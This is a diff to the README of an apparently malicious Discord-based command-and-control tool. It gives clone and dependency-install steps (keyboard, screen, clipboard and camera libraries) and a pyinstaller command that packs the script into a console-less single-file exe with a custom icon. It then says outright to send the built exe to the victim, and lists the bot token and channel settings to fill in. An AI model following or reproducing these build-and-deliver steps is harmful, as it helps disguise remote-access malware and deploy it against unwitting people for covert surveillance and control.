@@ -12,12 +12,20 @@
 **Discord C2 Commands (@Huzaifa818)** 
 
 **✅ How to Use**
-1-`git clone https://github.com/huzaifa818/Discord-c2.git `
+1- Clone the repo:
+`git clone https://github.com/huzaifa818/Discord-c2.git `
 
-#Install dependencies: ` pip install discord.py pyautogui pyperclip psutil pynput pillow `
+#Install dependencies: 
+**Using Window 10/11 to make exe:**
+#Install Requirement:
+1- Install python latest and set in Environment variable
 
-#Replace BOT_TOKEN, CHANNEL_ID, ALLOWED_USER_IDS with your own.
+ `pip install discord.py pyautogui pynput pyperclip psutil pillow opencv-python`
 
+3- Command
+
+`pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py`
+-----------------------------After formed exe send it to victum---------------------------
 # CONFIG THESE IN discord_c2.py 
 
 BOT_TOKEN = "your_bot_token_here"          # Discord bot token
